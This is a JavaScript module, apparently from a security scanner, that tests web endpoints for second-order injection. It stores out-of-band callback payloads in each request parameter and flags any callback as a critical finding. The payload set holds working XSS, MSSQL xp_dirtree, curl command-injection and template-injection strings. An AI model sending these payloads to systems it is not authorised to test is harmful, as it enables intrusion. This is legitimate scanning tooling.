import axios from 'axios';
import { logger } from '../utils/logger.js';

export async function testSecondOrderInjection(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 10000;
    
    // We want to test endpoints that store data
    const isStateChanging = ['POST', 'PUT', 'PATCH'].includes(endpoint.method);
    if (!isStateChanging || !endpoint.parameters) return findings;

    if (!options.oastClient) {
        logger.debug('[SecondOrderInjection] Skipping test because no OAST client is provided.');
        return findings;
    }

    logger.info(`[SecondOrderInjection] Injecting delayed OAST payloads into: ${endpoint.url}`);

    const params = typeof endpoint.parameters === 'object' ? Object.keys(endpoint.parameters) : [];
    const oastDomain = options.oastClient.getDomain();

    for (const param of params) {
        try {
            // Generate a unique tracking ID for this specific parameter injection
            const trackerId = `so_${Math.random().toString(36).substring(2, 10)}`;
            
            // We register the injection with OAST so if a callback happens tomorrow, we know where it came from
            const result = await options.oastClient.injectAndVerify({
                testType: 'second_order',
                context: `param:${param}|tracker:${trackerId}`,
                injector: async (oast) => {
                    // Create payloads designed to trigger when the stored data is used later
                    // e.g. when an admin views the user profile (XSS), or a background job processes it (SSRF/RCE), or a DB script runs (SQLi)
                    
                    const payloads = {
                        xss: `"><script src="http://${oastDomain}/xss_${trackerId}.js"></script>`,
                        ssrf: `http://${oastDomain}/ssrf_${trackerId}`,
                        sqli: `1'; EXEC master..xp_dirtree '\\\\${oastDomain}\\sql_${trackerId}';--`,
                        os_cmd: `; curl http://${oastDomain}/cmd_${trackerId} ;`,
                        template: `{{ self.__init__.__globals__.__builtins__.__import__('urllib.request').urlopen('http://${oastDomain}/ssti_${trackerId}').read() }}`
                    };

                    const reqData = { ...endpoint.data };
                    
                    // We just pick one or two highly visible payloads to avoid spamming the DB too much, 
                    // or combine them into a polyglot
                    const polyglot = `http://${oastDomain}/${trackerId} '"><script src=http://${oastDomain}/${trackerId}></script>`;
                    
                    reqData[param] = polyglot;

                    await axios({
                        method: endpoint.method,
                        url: endpoint.url,
                        headers: { ...endpoint.headers, 'Content-Type': 'application/json' },
                        data: reqData,
                        timeout,
                        validateStatus: () => true
                    });
                },
                // We set a short timeout here just to check for immediate reflection,
                // but the real power of OAST is the central server logging async callbacks later.
                timeout: 5000 
            });

            // If it triggered immediately, it's a standard stored injection, but we log it as second-order since it was stored.
            if (result) {
                 findings.push({
                    assetId: endpoint.assetId,
                    endpointId: endpoint.id,
                    title: 'Second-Order Injection / Asynchronous Execution',
                    description: `Successfully injected a payload into parameter '${param}'. The payload executed asynchronously when the backend or an admin user processed the stored data, resulting in a callback to our OAST server.`,
                    category: 'INJECTION',
                    severity: 'CRITICAL',
                    cvss: 9.0,
                    detectedBy: 'second-order-engine',
                    confidence: 100,
                    evidence: result.evidence,
                    remediation: 'Ensure all data, even if read from your own database, is treated as untrusted and is properly sanitized/encoded before being used in SQL queries, OS commands, or rendered in HTML.'
                });
            }

        } catch (e) {}
    }

    return findings;
}
